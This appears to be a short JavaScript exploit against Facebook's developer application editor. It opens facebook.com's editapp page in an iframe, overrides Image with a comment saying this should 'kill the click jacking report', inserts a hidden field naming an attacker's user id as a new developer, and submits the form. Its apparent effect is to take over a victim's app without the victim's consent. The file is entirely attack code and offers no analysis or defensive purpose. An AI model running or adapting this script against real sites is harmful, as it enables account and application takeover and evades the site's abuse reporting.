
// this is for the iframe to facebook.com
document.domain = 'facebook.com'
 
uid = 501558012;
app_id = 123456789012332;
function Image(){
   // this should kill the click jacking report
}
 
// create a new iframe we will use to load facebook.com
var tempIFrame=document.createElement('iframe');
 
tempIFrame.setAttribute('id','RSIFrame');
 
// attach the iframe to the page
IFrameObj = document.body.appendChild(tempIFrame);
 
//once its loaded create a new form element and post the form
IFrameObj.onload = function(){
    doc = IFrameObj.contentWindow.document;
    IFrameObj.contentWindow.onbeforeleavehooks = [];
 
    new_element = doc.createElement("input");
    new_element.setAttribute("type", "hidden");
    new_element.setAttribute("name", "new_dev_friends[]");
    new_element.setAttribute("id", "new_dev_friends_"+uid);
    new_element.setAttribute("value", uid);
    doc.forms['editapp'].appendChild(new_element);
    doc.forms['editapp'].submit();
 
}
 
// load the iframe
IFrameObj.src = 'http://www.facebook.com/developers/editapp.php?app_id='+app_id
